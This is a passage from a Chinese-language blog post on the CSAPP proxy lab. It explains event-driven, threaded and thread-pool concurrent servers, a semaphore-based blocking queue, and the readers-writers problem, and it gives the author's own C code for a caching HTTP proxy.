= Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">            <span class="comment">// 添加并开始监听新的客户端连接</span></span><br><span class="line">            add_client(connfd, &amp;pool);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查已经建立连接的客户端事件，并进行处理</span></span><br><span class="line">        check_clients(&amp;pool);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_client</span><span class="params">(<span class="keyword">int</span> connfd, pool *p)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    p-&gt;nready--;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; FD_SETSIZE; i++) <span class="comment">/* Find an available slot */</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;clientfd[i] &lt; <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="comment">/* Add connected descriptor to the pool */</span></span><br><span class="line">            p-&gt;clientfd[i] = connfd;</span><br><span class="line">            Rio_readinitb(&amp;p-&gt;clientrio[i], connfd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Add the descriptor to descriptor set */</span></span><br><span class="line">            FD_SET(connfd, &amp;p-&gt;read_set);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Update max descriptor and pool high water mark */</span></span><br><span class="line">            <span class="keyword">if</span> (connfd &gt; p-&gt;maxfd)</span><br><span class="line">                p-&gt;maxfd = connfd;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; p-&gt;maxi)</span><br><span class="line">                p-&gt;maxi = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    <span class="keyword">if</span> (i == FD_SETSIZE) <span class="comment">/* Couldn’t find an empty slot */</span></span><br><span class="line">        app_error(<span class="string">"add_client error: Too many clients"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_clients</span><span class="params">(pool *p)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, connfd, n;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="keyword">rio_t</span> rio;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; (i &lt;= p-&gt;maxi) &amp;&amp; (p-&gt;nready &gt; <span class="number">0</span>); i++)</span><br><span class="line">    {</span><br><span class="line">        connfd = p-&gt;clientfd[i];</span><br><span class="line">        rio = p-&gt;clientrio[i];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If the descriptor is ready, echo a text line from it */</span></span><br><span class="line">        <span class="keyword">if</span> ((connfd &gt; <span class="number">0</span>) &amp;&amp; (FD_ISSET(connfd, &amp;p-&gt;ready_set)))</span><br><span class="line">        {</span><br><span class="line">            p-&gt;nready--;</span><br><span class="line">            <span class="keyword">if</span> ((n = Rio_readlineb(&amp;rio, buf, MAXLINE)) != <span class="number">0</span>)</span><br><span class="line">            {</span><br><span class="line">                byte_cnt += n;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Server received %d (%d total) bytes on fd %d\n"</span>,</span><br><span class="line">                       n, byte_cnt, connfd);</span><br><span class="line">                Rio_writen(connfd, buf, n);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* EOF detected, remove descriptor from pool */</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            {</span><br><span class="line">                Close(connfd);</span><br><span class="line">                FD_CLR(connfd, &amp;p-&gt;read_set);</span><br><span class="line">                p-&gt;clientfd[i] = <span class="number">-1</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>可以看出来，核心的逻辑在于维护要监听的 <code>fd</code> 列表，在一个循环中，使用 <code>Select</code> 反复监听 IO 事件到来，并进行处理：</p>
<ul>
<li>来自 <code>listenfd</code> 的新连接：通过 <code>Accept</code> 获取新的连接 <code>connfd</code>，添加到客户端列表中，并开始监听</li>
<li>来自已经建立连接的 <code>connfd</code> 的读写：读取并处理，如果收到 EOF，关闭连接移除监听</li>
</ul>
<p>这种方式有以下优点：</p>
<ul>
<li>灵活：程序员可以更好地控制程序的行为，比如为某些客户端优先提供服务。</li>
<li>单线程：只有一个线程，可以方便地在不同函数内共享全局变量，没有并发问题，也更利于调试。</li>
</ul>
<p>也有着以下缺点：</p>
<ul>
<li>编程复杂度：事件驱动的编程模型的复杂度是基于进程的方法的数倍，而且并发粒度越细，模型越复杂。对比之下，基于进程的方法容易设计出干净的代码结构。</li>
<li>无法利用多核优势：只使用了单线程。</li>
</ul>
<h3 id="线程并发">线程并发</h3>
<p>与进程的思想类似，使用线程来实现。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"csapp.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">(<span class="keyword">int</span> connfd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> listenfd, *connfdp;</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line">        connfdp = Malloc(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        *connfdp = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">        <span class="comment">// 创建新线程处理客户端的连接</span></span><br><span class="line">        Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, connfdp);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Thread routine */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> connfd = *((<span class="keyword">int</span> *)vargp);</span><br><span class="line">    Pthread_detach(pthread_self());</span><br><span class="line">    Free(vargp);</span><br><span class="line">    echo(connfd);</span><br><span class="line">    Close(connfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>还可以使用线程池的方法，通过复用线程进一步减少线程创建和销毁的开销，代码如下。这是一个典型的生产者 - 消费者模型，主线程作为生产者，通过 <code>Accept</code> 获取新连接，工作线程为消费者，处理新连接的读写逻辑。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 线程安全的阻塞队列</span></span><br><span class="line"><span class="keyword">sbuf_t</span> sbuf; <span class="comment">/* Shared buffer of connected descriptors */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, listenfd, connfd;</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    sbuf_init(&amp;sbuf, SBUFSIZE);</span><br><span class="line">    <span class="comment">// 创建工作线程</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NTHREADS; i++)</span><br><span class="line">        Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">        <span class="comment">// 将客户端连接存放在阻塞队列中</span></span><br><span class="line">        sbuf_insert(&amp;sbuf, connfd); <span class="comment">/* Insert connfd in buffer */</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Pthread_detach(pthread_self());</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 阻塞等到获取客户端fd</span></span><br><span class="line">        <span class="keyword">int</span> connfd = sbuf_remove(&amp;sbuf);</span><br><span class="line">        <span class="comment">// 为客户端服务</span></span><br><span class="line">        echo_cnt(connfd);</span><br><span class="line">        Close(connfd);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>线程的方法有如下优点：</p>
<ul>
<li>方便共享状态：线程间共享地址空间</li>
<li>开销小：创建、销毁、切换的开销更小，且可以通过线程池进一步减少开销</li>
</ul>
<p>缺点在于：</p>
<ul>
<li>并发问题：无意识的共享可能会使得线程状态被污染，进而出错。还可能出现竞态条件、死锁等问题。</li>
</ul>
<h2 id="part-1">Part 1</h2>
<p>实现基础的 http 代理功能，需要做的事情很清晰：</p>
<ol type="1">
<li>接受客户端连接，解析 http 请求行（端口与 uri）与请求头</li>
<li>与目标服务器建立连接，初始化 http 请求行，设置代理请求头，转发额外请求头</li>
<li>将目标服务器的响应转发给客户端</li>
</ol>
<h2 id="part-2">Part 2</h2>
<p>实现代理服务器的并发。这里可以使用上面提到的线程池的方法，通过生产者 - 消费者的模式交互。先实现一个阻塞队列，<code>sbuf.h</code> 代码如下，队列中包含三个信号量，用于同步。<code>mutex</code> 控制了循环队列 <code>buf</code> 的互斥读写，<code>slots,items</code> 记录了队列中的空槽和物品的数量，控制生产者与消费者的等待逻辑。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">int</span> *buf;    <span class="comment">/* Buffer array */</span></span><br><span class="line">    <span class="keyword">int</span> n;       <span class="comment">/* Maximum number of slots */</span></span><br><span class="line">    <span class="keyword">int</span> front;   <span class="comment">/* buf[(front+1)%n] is first item */</span></span><br><span class="line">    <span class="keyword">int</span> rear;    <span class="comment">/* buf[rear%n] is last item */</span></span><br><span class="line">    <span class="keyword">sem_t</span> mutex; <span class="comment">/* Protects accesses to buf */</span></span><br><span class="line">    <span class="keyword">sem_t</span> slots; <span class="comment">/* Counts available slots */</span></span><br><span class="line">    <span class="keyword">sem_t</span> items; <span class="comment">/* Counts available items */</span></span><br><span class="line">} <span class="keyword">sbuf_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> item)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p><code>sbuf.c</code> 代码如下。初始化时，队列为空，<code>slots</code> 为 <code>n</code>，物品数量为 0。在插入新元素时，需要先阻塞等到有空槽 <code>P(slots)</code>，再获取队列的互斥锁 <code>P(mutex)</code> 进行插入。在读取新元素时，需要先阻塞等到有元素 <code>P(items)</code>，再获取队列的互斥锁 <code>P(mutex)</code> 进行读取并删除。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sbuf.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"csapp.h"</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_init</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    sp-&gt;buf = Calloc(n, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    sp-&gt;n = n;                  <span class="comment">/* Buffer holds max of n items */</span></span><br><span class="line">    sp-&gt;front = sp-&gt;rear = <span class="number">0</span>;   <span class="comment">/* Empty buffer iff front == rear */</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;mutex, <span class="number">0</span>, <span class="number">1</span>); <span class="comment">/* Binary semaphore for locking */</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;slots, <span class="number">0</span>, n); <span class="comment">/* Initially, buf has n empty slots */</span></span><br><span class="line">    Sem_init(&amp;sp-&gt;items, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* Initially, buf has zero data items */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Clean up buffer sp */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_deinit</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    Free(sp-&gt;buf);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert item onto the rear of shared buffer sp */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sbuf_insert</span><span class="params">(<span class="keyword">sbuf_t</span> *sp, <span class="keyword">int</span> item)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    P(&amp;sp-&gt;slots);                          <span class="comment">/* Wait for available slot */</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);                          <span class="comment">/* Lock the buffer */</span></span><br><span class="line">    sp-&gt;buf[(++sp-&gt;rear) % (sp-&gt;n)] = item; <span class="comment">/* Insert the item */</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);                          <span class="comment">/* Unlock the buffer */</span></span><br><span class="line">    V(&amp;sp-&gt;items);                          <span class="comment">/* Announce available item */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove and return the first item from buffer sp */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sbuf_remove</span><span class="params">(<span class="keyword">sbuf_t</span> *sp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line">    P(&amp;sp-&gt;items);                           <span class="comment">/* Wait for available item */</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);                           <span class="comment">/* Lock the buffer */</span></span><br><span class="line">    item = sp-&gt;buf[(++sp-&gt;front) % (sp-&gt;n)]; <span class="comment">/* Remove the item */</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);                           <span class="comment">/* Unlock the buffer */</span></span><br><span class="line">    V(&amp;sp-&gt;slots);                           <span class="comment">/* Announce available slot */</span></span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>在 <code>Java</code> 中的阻塞队列，也是类似的实现逻辑。区别在于，只使用了一个可重入锁，搭配两个条件变量 <code>notempty, notfull</code> 标识队列是否非满与非空。</p>
<h2 id="part-3">Part 3</h2>
<p>实现缓存功能，缓存客户端请求的资源，减少与服务端交互。在服务端并行的设置下，<code>cache</code> 的读写显然必须有锁保护。然而，一把大锁会使得所有请求变为串行执行，是不可行的，可以从两个角度改进：</p>
<ul>
<li>分段锁。划分多个 <code>cache</code>，根据 hash 路由，每次读写只在段内加锁，jdk 1.7 之前的 <code>ConcurrentHashMap</code> 就是这种思想。</li>
<li>优先读。考虑到 <code>cache</code> 的读多于写，而读取时可以不需要加锁，写入时才需要加锁。因此，可以优先保证读取，来提高性能。可以通过读者写者问题的解决方法实现。</li>
</ul>
<p>读者写者问题（Readers-Writes Problem）是互斥问题的通用描述，，具体为：</p>
<ul>
<li>读者线程只读取对象</li>
<li>写者线程修改对象</li>
<li>写者对于对象的访问是互斥的</li>
<li>多个读者可以同时读取对象</li>
</ul>
<p>常见的应用场景是：</p>
<ul>
<li>在线订票系统：所有顾客都在查看座位，正在订票的顾客必须对数据库有互斥访问权限。</li>
<li>多线程缓存 web 代理：多个线程可以读取缓存，但要写入的线程必须有互斥访问权限。</li>
</ul>
<p>根据不同的读写策略，可以分为两类读者写者问题，需要注意的是，这两种情况都可能出现 starvation（饥饿）。</p>
<blockquote>
<p>第一类读者写者问题（读者优先）</p>
</blockquote>
<ul>
<li>如果写者没有获取到使用对象的权限，不应该让读者等待</li>
<li>在等待的写者之后到来的读者应该在写者之前处理</li>
<li>也就是说，只有没有读者的情况下，写者才能工作</li>
</ul>
<blockquote>
<p>第二类读者写者问题（写者优先）</p>
</blockquote>
<ul>
<li>一旦写者可以处理的时候，就不应该进行等待</li>
<li>在等待的写者之后到来的读者应该在写者之后处理</li>
</ul>
<p>读者优先的代码如下。第一个读者到来时，获取写锁 <code>P(w)</code> 来阻塞后续写入，最后一个读取完毕的读者释放写锁 <code>V(w)</code> 允许后续写入。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* Global variables */</span></span><br><span class="line"><span class="keyword">int</span> readcnt;    <span class="comment">/* Initially = 0 */</span></span><br><span class="line"><span class="keyword">sem_t</span> mutex, w; <span class="comment">/* Both initially = 1 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reader</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(&amp;mutex);</span><br><span class="line">        readcnt++;</span><br><span class="line">        <span class="keyword">if</span> (readcnt == <span class="number">1</span>) <span class="comment">/* First in */</span></span><br><span class="line">            P(&amp;w);</span><br><span class="line">        V(&amp;mutex);</span><br><span class="line">        <span class="comment">/* Critical section */</span></span><br><span class="line">        <span class="comment">/* Reading happens */</span></span><br><span class="line">        P(&amp;mutex);</span><br><span class="line">        readcnt--;</span><br><span class="line">        <span class="keyword">if</span> (readcnt == <span class="number">0</span>) <span class="comment">/* Last out */</span></span><br><span class="line">            V(&amp;w);</span><br><span class="line">        V(&amp;mutex);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writer</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        P(&amp;w);</span><br><span class="line">        <span class="comment">/* Critical section */</span></span><br><span class="line">        <span class="comment">/* Writing happens */</span></span><br><span class="line">        V(&amp;w);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="代码与结果">代码与结果</h2>
<p><code>cache</code> 部分我复用了之前 <code>cachelab</code> 的代码，修改成了分段锁的版本。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"csapp.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sbuf.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cache.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">parse_porturi</span><span class="params">(<span class="keyword">char</span> *url, <span class="keyword">char</span> *dest, <span class="keyword">char</span> **uri)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread_once</span><span class="params">(<span class="keyword">void</span> *vargp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Recommended max cache and object sizes */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_CACHE_SIZE 1049000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTHREADS 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SBUFSIZE 16</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_CACHE_SETS 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* You won't lose style points for including this long line in your code */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *user_agent_hdr = <span class="string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n"</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *(kept_headers[<span class="number">5</span>]) = {<span class="string">"Host"</span>, <span class="string">"User-Agent"</span>, <span class="string">"Connection"</span>, <span class="string">"Proxy-Connection"</span>, <span class="literal">NULL</span>};</span><br><span class="line"><span class="keyword">sbuf_t</span> sbuf; <span class="comment">/* Shared buffer of connected descriptors */</span></span><br><span class="line"><span class="keyword">static</span> Cache *cache;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, user_agent_hdr);</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check command line args */</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    <span class="comment">// 初始化阻塞队列</span></span><br><span class="line">    sbuf_init(&amp;sbuf, SBUFSIZE);</span><br><span class="line">    <span class="comment">// 屏蔽SIGPIPE信号</span></span><br><span class="line">    Signal(SIGPIPE, SIG_IGN);</span><br><span class="line">    cache = newCache(N_CACHE_SETS, MAX_CACHE_SIZE, MAX_OBJECT_SIZE);</span><br><span class="line">    <span class="comment">// 线程池</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NTHREADS; i++)</span><br><span class="line">    {</span><br><span class="line">        Pthread_create(&amp;tid, <span class="literal">NULL</span>, thread, <span class="literal">NULL</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); </span><br><span class="line">        Getnameinfo((SA *)&amp;clientaddr, clientlen, hostname, MAXLINE,</span><br><span class="line">                    port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">        sbuf_insert(&amp;sbuf, connfd);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Accepted connection from (%s, %s) at fd %d\n"</span>, hostname, port, connfd);</span><br><span class="line">        <span class="comment">// int *vargp = malloc(sizeof(int));</span></span><br><span class="line">        <span class="comment">// *vargp = connfd;</span></span><br><span class="line">        <span class="comment">// Pthread_create(&amp;tid, NULL, thread_once, vargp);</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">(<span class="keyword">int</span> client_fd)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> server_fd;</span><br><span class="line">    <span class="keyword">char</span> buf[MAXLINE], method[MAXLINE], url[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="keyword">rio_t</span> client_rio, server_rio;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">    Rio_readinitb(&amp;client_rio, client_fd);</span><br><span class="line">    <span class="keyword">if</span> (!Rio_readlineb(&amp;client_rio, buf, MAXLINE)) </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 读取请求行</span></span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">"%s %s %s"</span>, method, url, version); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> server_port[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> *uri = <span class="string">""</span>;</span><br><span class="line">    <span class="comment">// 解析uri与端口</span></span><br><span class="line">    parse_porturi(url, server_port, &amp;uri);</span><br><span class="line">    CacheVisit visit;</span><br><span class="line">    visit.key = uri;</span><br><span class="line">    CacheData *cacheData = fetch(cache, &amp;visit);</span><br><span class="line">    <span class="comment">// cache命中</span></span><br><span class="line">    <span class="keyword">if</span> (cacheData != <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"uri %s hit cache, address %p, size %d\n"</span>, uri, cacheData-&gt;data, cacheData-&gt;size);</span><br><span class="line">        Rio_writen(client_fd, cacheData-&gt;data, cacheData-&gt;size);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uri %s miss cache\n"</span>, uri);</span><br><span class="line">    <span class="comment">// 与服务端建立连接</span></span><br><span class="line">    server_fd = Open_clientfd(<span class="string">"localhost"</span>, server_port);</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"GET %s HTTP/1.0\r\n"</span>, uri);</span><br><span class="line">    Rio_writen(server_fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="comment">// 设置代理header</span></span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"Host: www.cmu.edu\r\n"</span>);</span><br><span class="line">    Rio_writen(server_fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"User-Agent: %s\r\n"</span>, user_agent_hdr);</span><br><span class="line">    Rio_writen(server_fd, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    <span class="built_in">sprintf</span>(buf, <span class="string">"Connection: close\r\n"</span>);</span><br><span class="line">    Rio_writen(server_fd, 